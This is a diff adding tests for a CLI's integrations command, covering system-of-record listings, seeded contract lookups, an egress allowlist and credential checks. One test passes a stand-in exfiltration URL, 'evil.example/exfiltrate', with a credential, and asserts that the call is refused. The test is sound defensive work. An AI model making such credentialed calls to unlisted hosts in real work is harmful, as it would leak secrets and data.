@@ -202,3 +202,109 @@ describe("operator command line", () => {
     expect(result.stdout).toMatch(/Audit chain INTACT/);
   }, 90_000);
 });
+
+describe("pv integrations — the governed path to the systems of record", () => {
+  it("prints usage and exits non-zero when given no subcommand", async () => {
+    const result = await cli(["integrations"]);
+    expect(result.code).toBe(2);
+    expect(result.stderr).toMatch(/pv integrations/);
+  });
+
+  it("lists the systems of record and states the shape is unconfirmed", async () => {
+    const result = await cli(["integrations", "list"]);
+    expect(result.code).toBe(0);
+    expect(result.stdout).toMatch(/contract-records/);
+    expect(result.stdout).toMatch(/association-records/);
+    // Every shape is an informed guess until MVW confirms it.
+    expect(result.stdout).toMatch(/CONFIRMED/);
+    expect(result.stdout).toMatch(/\bNO\b/);
+  });
+
+  it("names the egress allowlist that bounds every outbound call", async () => {
+    const result = await cli(["integrations", "list"], {
+      PV_EGRESS_ALLOWLIST: "contracts.partner.example.com",
+    });
+    expect(result.code).toBe(0);
+    expect(result.stderr).toMatch(/contracts\.partner\.example\.com/);
+    const empty = await cli(["integrations", "list"]);
+    expect(empty.stderr).toMatch(/empty.*refused/i);
+  });
+
+  it("reads a seeded contract record through the port", async () => {
+    const result = await cli(["integrations", "contract", "show", "ctr_fl_recent_complete"]);
+    expect(result.code).toBe(0);
+    expect(result.stdout).toMatch(/jurisdiction\s+FL/);
+    expect(result.stdout).toMatch(/ctr_fl_recent_complete/);
+  });
+
+  it("reports a contract the system of record does not hold as absent, not as a fabrication", async () => {
+    const result = await cli(["integrations", "contract", "show", "ctr_does_not_exist"]);
+    expect(result.code).toBe(1);
+    expect(result.stderr).toMatch(/No contract record/);
+    expect(result.stdout).toBe("");
+  });
+
+  it("reads a seeded association and its budget through the port", async () => {
+    const result = await cli([
+      "integrations",
+      "association",
+      "show",
+      "1042",
+      "--fiscal-year",
+      "2026",
+    ]);
+    expect(result.code).toBe(0);
+    expect(result.stdout).toMatch(/Palm Grove/);
+    expect(result.stdout).toMatch(/reserve/i);
+  });
+
+  it("refuses a governed egress call to a host the allowlist does not name", async () => {
+    const result = await cli(
+      [
+        "integrations",
+        "call",
+        "--url",
+        "https://evil.example/exfiltrate",
+        "--integration",
+        "contract-records",
+        "--credential",
+        "contract-records",
+      ],
+      { PV_EGRESS_ALLOWLIST: "contracts.partner.example.com" },
+    );
+    // Fail closed, refused before anything leaves the process.
+    expect(result.code).toBe(1);
+    expect(result.stderr).toMatch(/Refused \(integration\.host_not_allowlisted\)/);
+  });
+
+  it("refuses an allowlisted call whose credential is not configured", async () => {
+    // The allowlist lets the host through; the credential control still refuses,
+    // because no credential is configured for it. Fail closed at every gate.
+    const result = await cli(
+      [
+        "integrations",
+        "call",
+        "--url",
+        "https://contracts.partner.example.com/contracts/x",
+        "--integration",
+        "contract-records",
+        "--credential",
+        "contract-records",
+      ],
+      { PV_EGRESS_ALLOWLIST: "contracts.partner.example.com" },
+    );
+    expect(result.code).toBe(1);
+    expect(result.stderr).toMatch(/Refused \(integration\.credential_missing\)/);
+  });
+
+  it("keeps a listing's stdout parseable so it can be filed as evidence", async () => {
+    const result = await cli(["integrations", "list", "--json"]);
+    expect(result.code).toBe(0);
+    const parsed = JSON.parse(result.stdout) as {
+      egressAllowlist: string[];
+      integrations: { name: string; shapeConfirmedWithMvw: boolean }[];
+    };
+    expect(Array.isArray(parsed.egressAllowlist)).toBe(true);
+    expect(parsed.integrations.every((entry) => entry.shapeConfirmedWithMvw === false)).toBe(true);
+  });
+});
